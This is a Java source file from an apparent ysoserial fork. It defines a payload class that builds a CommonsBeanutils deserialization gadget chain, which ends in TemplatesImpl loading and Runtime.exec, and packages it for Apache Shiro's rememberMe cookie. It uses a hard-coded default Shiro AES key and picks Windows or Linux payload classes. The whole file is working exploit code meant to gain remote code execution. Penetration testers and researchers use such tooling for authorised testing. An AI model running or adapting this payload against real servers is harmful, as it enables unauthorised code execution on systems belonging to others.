package ysoserial.payloads;

import org.apache.commons.beanutils.BeanComparator;
import ysoserial.features.GenerateShiro;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.external.*;
import ysoserial.payloads.util.Gadgets1;
import ysoserial.payloads.util.Gadgets2;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.math.BigInteger;
import java.util.HashMap;
import java.util.PriorityQueue;

// import ysoserial.features.GenerateApereo;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
public class shiro_CommonsBeanutils1 implements ObjectPayload<String> {
    public String getObject(HashMap<String, String> vars) throws Exception {
        String platform = vars.get("platform");
        String vector = vars.get("vector").length() != 0 ? vars.get("vector") : "kPH+bIxk5D2deZiIxcaaaA==";

        Class classpayload = null;
        if (platform.startsWith("win")) {
            classpayload = Shiro_win.class;
        } else {
            classpayload = Shiro_linux.class;
        }
        final Object templates = Gadgets2.createTemplatesImpl(classpayload);
        // mock method name until armed
        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return GenerateShiro.sendpayload(queue, vector);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(shiro_CommonsBeanutils1.class, args);
    }

}
